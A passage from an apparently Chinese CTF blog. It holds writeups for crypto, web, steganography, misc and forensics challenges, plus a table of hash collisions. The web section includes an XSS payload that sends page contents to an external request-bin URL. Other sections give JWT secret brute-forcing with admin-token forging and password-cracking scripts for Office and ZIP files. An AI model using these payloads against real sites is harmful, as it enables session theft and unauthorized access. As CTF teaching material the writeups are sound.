len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) 2. Cryptoman-vs-matrix:题目描述： 打开下载文件会看到： 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27位，27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] 是几个随机数的生成器（RNG），但生成逻辑非常简单。 每次会计算$$(M \\cdot state) \\cdot new_state$$(括号外的乘法是内积。在sage里，矩阵与矩阵&#x2F;向量的乘法和向量与向量的内积都是用*)。并且有$$new_state[i] &#x3D; 2^{state[i]}.$$这里的初始state是已知的，所以我们只需要建立一个9元1次线性方程组即可。 我们可以写一段sagemath的代码来通过解方程逆推出matrix以及flag内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# 初始状态 S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# 求出 S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# 构造线性方程组 X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec 的顺序: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# 求解 9 个未知量M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# 将 3x3 矩阵以行优先顺序（row-major）展开成 9 个元素# 对应当初 [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage 返回的是 GF(p) 的元素，先转成普通整型 val = int(M_mat[i, j]) m_ints.append(val)# 将每个 val 转成 3 字节后依次拼接seed_recovered = b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# 最终还原 flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#最后得到的结果：# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"http://example.com/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"哈希加密的长度与碰撞情况","slug":"哈希加密的长度与碰撞情况","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-11T10:35:55.170Z","comments":true,"path":"2025/03/09/哈希加密的长度与碰撞情况/","permalink":"http://example.com/2025/03/09/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"常见的哈希函数的长度及其碰撞情况汇总","text":"以下是各种常见的哈希函数的长度及其碰撞情况汇总： 哈希长度 (bit) 常见算法 碰撞情况 碰撞年份 发明年份 状态 128-bit MD5 存在已知有效碰撞攻击 2004 年 1992 年 已过时，不推荐使用 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: 存在已知有效碰撞攻击 SHA-0: 2004 年 SHA-0: 1993 年 SHA-0: 已弃用，不推荐使用 SHA-1: 存在已知有效碰撞攻击 SHA-1: 2017 年 SHA-1: 1995 年 已过时，不推荐使用 256-bit SHA-256, SHA-3-256 暂无已知有效碰撞攻击 - SHA-256: 2001 年 安全，广泛使用 384-bit SHA-384 暂无已知有效碰撞攻击 - 2001 年 安全，高安全性需求 512-bit SHA-512, SHA-3-512 暂无已知有效碰撞攻击 - SHA-512: 2001 年 非常安全，高性能需求 碰撞情况说明 128-bit (MD5): MD5 是一种输出为 128 位的哈希算法，但由于其设计的安全性不足，早在 2004 年就被发现可以有效制造碰撞。 MD5 于 1992 年被发明，不适合任何需要密码学安全性的场景，仅可用于低安全性完整性校验。 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 是 SHA 系列的初代版本，存在严重的设计缺陷，在 2004 年被证明可以制造碰撞。SHA-0 于 1993 年发明。 SHA-1 作为输出 160 位的主流算法，在 2017 年被证实可以通过理论和实践攻击制造碰撞。SHA-1 于 1995 年发明。 RIPEMD-160 虽尚未有公开的碰撞记录，但不如更高位算法安全。 256-bit (SHA-256, SHA-3-256): 目前没有已知的碰撞攻击。 SHA-256 于 2001 年被发明，适合绝大多数场景，如数字签名、区块链和数据完整性验证。 384-bit (SHA-384): 为高安全需求设计，未有任何已知的碰撞攻击。 SHA-384 于 2001 年发明，适用于密钥交换、长时间数据存储等高安全性应用。 512-bit (SHA-512, SHA-3-512): 提供极高的安全性，特别适用于对抗潜在的量子计算威胁。 SHA-512 于 2001 年发明，性能消耗较高，适合长期存储的场景。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"CTF小知识","slug":"CTF/CTF小知识","permalink":"http://example.com/categories/CTF/CTF%E5%B0%8F%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"CTF,哈希","slug":"CTF-哈希","permalink":"http://example.com/tags/CTF-%E5%93%88%E5%B8%8C/"}]},{"title":"E-CTF比赛 Writeup","slug":"Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-03-11T10:34:32.193Z","comments":true,"path":"2025/03/03/Writeup/E-CTF-Writeup/","permalink":"http://example.com/2025/03/03/Writeup/E-CTF-Writeup/","excerpt":"E-CTF比赛的题解，涉及方向：Crypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptography（密码学）ASCII me anything but not the flag 根据它的提示，我们先将这段内容用ASCII解码，得到： 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? 第三段的指的是凯撒大帝被刺杀的事件： 所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息： 1Here is your key, good luck : KEYKEY 可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（https://planetcalc.com/2468/#google_vignette）便可以得到flag： 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI 😼 由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是： 1ectf&#123;y0U_5p1N_M3 而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分： 1R1GhT_R0unD_B4bY&#125; 拼在一起得到flag： 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder 首先会下载得到3个文件： 由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它： 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;成功破解密码: &#123;password&#125;&quot;) break except Exception: continue# 成功破解密码: dolphin 打开Excel文件后会看到3部分内容 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u 首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来： 1prescription 第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到： 1digestive 第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解 https://hashes.com/en/decrypt/hash 提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。） 于是用 1dolphin_spooky_digestive_prescription 成功解压.zip压缩包得到flag： 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro 这道题我们会得到以下内容： 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 因为没有其他信息了，所以我们先用 http://www.factordb.com/index.php 试一下暴力分解n： 成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag： 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;解密结果:&quot;, plaintext)# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault 这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。 我们首先来看一下加密的具体过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) 我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed 所以我们只需要逆向一下这个加密逻辑便可以得到flag： 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three 我们首先会得到这些内容： 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY 直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码： 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN 发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到： 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token 先简单科普一下JWT： JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算 1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥) 以确保当前信息的完整性（integrity），真实性（authenticity）。 在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM 用 https://jwt.io/ 分析一下： 可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。 根据题目的提示，我们先将这个JWT的密钥给爆破出来： 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 用这个网站将我们的JWT的payload改成“admin” 之后再用这个新的JWT访问网站即可得到flag： 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin 这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 https://pipedream.com/ 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。）， 然后在对话框里输入以下内容即可： 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; 之后便会在Request Bin的访问纪录里查看flag： 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganography（隐写）Definitely not in the PDF 将下载的压缩包解压会得到一份pdf文件： 并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag： 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 我们会得到一份乐谱： 通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。 通过谷歌搜索“music Steganography 1804”可以发现这个维基词条： 点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码： 根据这张密码表解码会得到： 1ectf&#123;steganomousiqueissuperswag&#125; (法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。) The island’s treasure 下载文件会得到2张图片： 首先用010 Editor打开第一张图片会发现 在Description后面有一段base64编码 1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= 解码后会得到 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= 再解码一次会得到key1： 1234Félicitations ! Tu as trouvé la clé n°1 du coffre !Congratulations ! You found the key n°1 of the chest !Clé: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到 我们将这张照片导出会得到第二部分的key（key2）： 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego： 提取出来的照片为： 成功找到flag： 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk 这道题我们会得到一张图片： 非常赛博风。 注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文： （近点的那栋大楼） （画面左边远处的那栋大楼） 第一张里面的盲文翻译过来是： 1This is just a dummyy, nice try 而第二张里面的内容才是真正的flag： 12345⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎-&gt;h1dd3n1nth3d4rkn3ss (可以用这个网站翻译盲文内容：https://www.dcode.fr/alphabet-braille) 根据题目的flag格式要求，我们确定flag为： 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault 这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# 定义初始zip文件路径和字典文件路径zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # 记录所有找到的密码def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # 转换为字节格式 try: zip_file.extractall(pwd=password) print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # 获取解压后的文件夹或文件名 extracted_files = zip_file.namelist() return extracted_files # 返回解压出的文件名列表 except (RuntimeError, zipfile.BadZipFile, zlib.error): continue print(&quot;[-] 未找到密码，请尝试其他字典或方法。&quot;) return None except FileNotFoundError: print(&quot;[!] 文件未找到，请检查路径是否正确。&quot;) return None except zlib.error: print(&quot;[!] 遇到 zlib 解压错误，终止爆破。&quot;) return None# 递归解压直到没有更多 zip 文件def recursive_brute_force(zip_path, dict_path): try: while zip_path: extracted_files = brute_force_zip(zip_path, dict_path) if not extracted_files: break # 查找新的 ZIP 文件 new_zip_path = None for file in extracted_files: if file.endswith(&quot;.zip&quot;): new_zip_path = file break if new_zip_path: zip_path = new_zip_path # 直接使用新找到的 ZIP 文件 else: print(&quot;[!] 没有找到更多的 ZIP 文件，任务完成！&quot;) break except zlib.error: print(&quot;[!] 发生 zlib 错误，终止爆破。&quot;) finally: # 将所有找到的密码写入文件 with open(&quot;found_passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: for password in passwords: f.write(password + &quot;\\n&quot;)# 运行爆破函数recursive_brute_force(zip_path, dict_path)print(&quot;所有找到的密码:&quot;, passwords) 注意，爆破到dwarf_vault_1.zip经常会返回奇怪的ERROR，所以这里的代码逻辑最好是在遇到意外ERROR时直接终止爆破并将现有的所有密码先写进txt文件，不然容易卡在这里重复很多次。 再成功解压dwarf_vault_1.zip后，我们会得到2份文件：drop_pod.py以及mining_report.txt。 txt文件的内容为： 1Mining report - flag coordinates: ectf&#123;[[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]&#125; 用coordinate将flag表示了出来。于是来检查drop_pod.py的内容： 12345678910111213141516171819202122232425262728293031323334#Maybe the flag was the friends we made along the waypassword = &quot; &quot;flag = &quot;FAKE FLAG THIS IS NOT REAL&quot;def find_positions(flag, crew_list): positions = [] for char in flag: if char == &quot;_&quot;: positions.append(&quot;_&quot;) continue found = False for i, name in enumerate(crew_list): if char.lower() in name.lower(): positions.append([i, name.lower().index(char.lower())]) found = True break if not found: positions.append([None, None]) return positionspositions = find_positions(flag, password.split())output_text = &quot;Mining report - flag coordinates: ectf&#123;&quot; + str(positions) + &quot;&#125;&quot;with open(&quot;mining_report.txt&quot;, &quot;w&quot;) as file: file.write(output_text)print(&quot;Rock and Stone! Report written to mining_report.txt:&quot;, output_text) 是这段坐标的生成逻辑。所以可以编写一段代码，靠我们刚才保存的所有压缩密码来还原flag： 123456789101112131415161718192021222324252627with open(&quot;found_passwords.txt&quot;, &quot;r&quot;) as file: reversed_passwords = file.readlines()# 去除换行符并反转列表（因为我们爆破时是从200开始的，所以这里需要反过来）password_list = [line.strip() for line in reversed_passwords][::-1]#txt里的内容positions = [[0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 6], [6, 8], [4, 7], [4, 7], [15, 5], &#x27;_&#x27;, [0, 3], [0, 9], [1, 7], [28, 7]]# 还原 flagflag = &quot;&quot;for pos in positions: if pos == &quot;_&quot;: flag += &quot;_&quot; else: i, j = pos if 0 &lt;= i &lt; len(password_list) and 0 &lt;= j &lt; len(password_list[i]): flag += password_list[i][j] else: flag += &quot;?&quot; # 标记错误或缺失数据# 输出结果print(&quot;flag:&quot;, &quot;ectf&#123;&quot; + flag + &quot;&#125;&quot;)# flag: ectf&#123;d1ggy_d1ggy_h0l3&#125; 5. ForensicMy dearest 我们会得到一份docx文件，也就是word文件。打开后在信息的作者处即可找到文件作者： 根据题目要求，flag为： 1ectf&#123;MichelTeller&#125; Capture the hidden 这道题我们会得到一份.pcap文件，用Wireshark打开它。 由于是要找一份文件，我们先点击“文件” -&gt; “导出对象” -&gt; “HTTP”： 确实发现了一份上传的文件。可以点击保存它，但是打开会发现内容不不完整： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1N 于是我们找这份文件在纪录里的具体位置： 可以看到我们保存的upload的文件内容只有蓝色部分，当我们将后续的内容也提出来，便会得到完整的flag： 12345data=ZWN0ZntQMDV0XzFzX3YzcnlfMzQ1eV9UMF9GMU5EfQ==-&gt;(base64)ectf&#123;P05t_1s_v3ry_345y_T0_F1ND&#125; Just a PCAP 这道题也是一份pcap文件，再次用Wireshark打开。 但是用之前的操作：“文件” -&gt; “导出对象” -&gt; “HTTP”，并不会发现任何东西。（实际上是因为这段纪录里并没有任何HTTP传输的内容。） 这时我们仔细观察第一条纪录的info会发现它是以”89504E47“，这是非常典型的PNG文件的文件头（因为它对应ASCII字符“‰PNG”），所以我们猜测这些纪录的info内容可以拼成一份完整的PNG文件。我们用这段代码将所有纪录的info内容提取出来并且保存成.png：（这段代码能运行的前提条件是下载了Wireshark\\的tshark.exe 123456789101112131415import pysharkimport pyshark.packetfrom binascii import unhexlifycapture = pyshark.FileCapture(&#x27;justapcap.pcap&#x27;, tshark_path=&#x27;D:\\\\Program Files\\\\Wireshark\\\\tshark.exe&#x27;) # 将这个路径替换成自己电脑上tshark.exe的路径hexstr = &quot;&quot;cnt = 0for packet in capture: s = str(packet) cur = s.split(&quot;Name:&quot;)[-1].split(&quot;.&quot;)[0].split(&quot;1m &quot;)[1] hexstr += curhexstr = hexstr.split(&quot;exam&quot;)[0]with open(&quot;a.png&quot;,&quot;wb&quot;) as f: f.write(unhexlify(hexstr)) 然后就会得到这张图片： 